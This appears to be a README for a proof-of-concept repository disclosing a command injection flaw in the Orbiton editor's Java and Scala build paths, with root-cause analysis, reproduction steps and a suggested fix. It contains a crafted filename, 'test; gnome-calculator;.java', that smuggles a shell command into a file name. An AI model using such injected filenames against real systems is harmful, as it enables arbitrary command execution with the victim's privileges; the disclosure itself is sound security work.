# Orbiton Editor Remote Code Execution (RCE) via Filename Placeholders

This repository contains a Proof of Concept (PoC) for a **Remote Code Execution (RCE)** vulnerability in the Orbiton text editor (tested on the latest version cloned from GitHub, November 2026).

## Vulnerability Details

*   **Vulnerability Type:** OS Command Injection (CWE-78) leading to Remote Code Execution (RCE).
*   **Affected Software:** Orbiton (Tested on the latest `main` branch as of Nov 2026).
*   **Platform:** Linux
*   **Impact:** An attacker can craft a filename containing shell metacharacters (e.g., semicolons `;`). When a user opens the file and triggers the build/run command (e.g., `Ctrl-Space`), arbitrary commands are executed with the user's privileges.

## Root Cause Analysis

The vulnerability stems from unsanitized filename substitution inside shell commands in `v2/build.go`.

When building Java files, Orbiton generates a shell command using the `exec.Command("sh", "-c", ...)` wrapper. The filenames are gathered using `find` and passed into the shell without proper escaping:

```go
// v2/build.go (around lines 380-389)
javaShellCommand := "javac -d _o_build $javaFiles; " + ...
cmd = exec.Command("sh", "-c", javaShellCommand)
```

Because the filenames are substituted raw into `$javaFiles`, the shell interprets metacharacters like `;` as command separators. 

## Reproduction Steps

**Prerequisites:** A Linux system with Orbiton installed, Java (`javac`) installed, and `gnome-calculator` (or any other application) available in the `$PATH`.

1.  **Create a Malicious File:**
    Open a terminal and create a file with a name designed to execute the GNOME Calculator:
    ```bash
    touch 'test; gnome-calculator;.java'
    ```

2.  **Insert Valid Java Code:**
    Put minimal Java code inside the file so Orbiton attempts to build it:
    ```java
    class InternalMain {
        public static void main(String[] args) {
            System.out.println("Hello from Orbiton");
        }
    }
    ```

3.  **Trigger the Build:**
    Open the file using Orbiton:
    ```bash
    o 'test; gnome-calculator;.java'
    ```
    Press the build shortcut (typically `Ctrl-Space` or `Ctrl-B`).

4.  **Observe the Result:**
    The shell executes `javac -d _o_build test`, then executes the injected command `gnome-calculator`, and finally ignores `.java`. The calculator application opens on the screen.

## Code References

*   `v2/build.go:389` - Command execution via `sh -c` with unescaped `$javaFiles`.
*   `v2/build.go:410` - Similar issue in the Scala build command (`$scalaFiles`).

## Expected Fix

To mitigate this vulnerability, Orbiton should avoid using `sh -c` for compilation when filenames are involved. Instead, it should pass the arguments directly to `exec.Command` (e.g., `exec.Command("javac", "-d", "_o_build", "file1.java", "file2.java")`). If a shell is absolutely necessary, filenames must be escaped using Go's `strconv.Quote()` or a similar shell-escaping mechanism before being inserted into the command string.
